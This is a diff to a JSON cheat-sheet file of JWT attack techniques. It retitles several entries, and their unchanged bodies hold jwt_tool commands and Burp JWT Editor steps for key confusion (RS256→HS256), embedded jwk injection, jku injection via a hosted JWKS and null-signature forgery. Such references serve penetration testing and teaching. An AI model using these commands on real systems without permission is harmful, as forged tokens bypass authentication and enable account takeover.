@@ -198,7 +198,7 @@
     },
     {
       "subcategory": "Key Confusion RS256→HS256",
-      "title": "Exploitation via jwt_tool",
+      "title": "Exploitation via jwt_tool: key confusion RS256→HS256",
       "language": "bash",
       "tags": ["key-confusion", "jwt-tool"],
       "body": "python3 jwt_tool.py JWT_HERE -X k -pk my_public.pem"
@@ -226,7 +226,7 @@
     },
     {
       "subcategory": "Key Injection (jwk)",
-      "title": "Exploitation via jwt_tool / JWT Editor",
+      "title": "Exploitation via jwt_tool / JWT Editor: key injection (jwk)",
       "language": "bash",
       "tags": ["key-injection", "jwt-tool", "jwk"],
       "body": "# jwt_tool: embed a jwk and re-sign\npython3 jwt_tool.py [JWT_HERE] -X i\n\n# JWT Editor (Burp):\n# 1. Add a New RSA key\n# 2. In Repeater, on the JWT tab, edit the data\n# 3. Attack > Embedded JWK"
@@ -254,7 +254,7 @@
     },
     {
       "subcategory": "jku header injection",
-      "title": "Exploitation via jwt_tool / JWT Editor",
+      "title": "Exploitation via jwt_tool / JWT Editor: jku injection",
       "language": "bash",
       "tags": ["jku", "jwt-tool", "jwks"],
       "body": "# jwt_tool\npython3 jwt_tool.py JWT_HERE -X s\npython3 jwt_tool.py JWT_HERE -X s -ju http://example.com/jwks.json\n\n# JWT Editor (Burp):\n# 1. Generate a new RSA key and host it\n# 2. Edit the token's data\n# 3. Replace the kid header with the one from your JWKS\n# 4. Add a jku header and sign the JWT (the Don't modify header option must be enabled)"
@@ -324,7 +324,7 @@
     },
     {
       "subcategory": "Null Signature",
-      "title": "Exploitation via jwt_tool",
+      "title": "Exploitation via jwt_tool: null signature",
       "language": "bash",
       "tags": ["null-signature", "jwt-tool"],
       "body": "python3 jwt_tool.py JWT_HERE -X n"
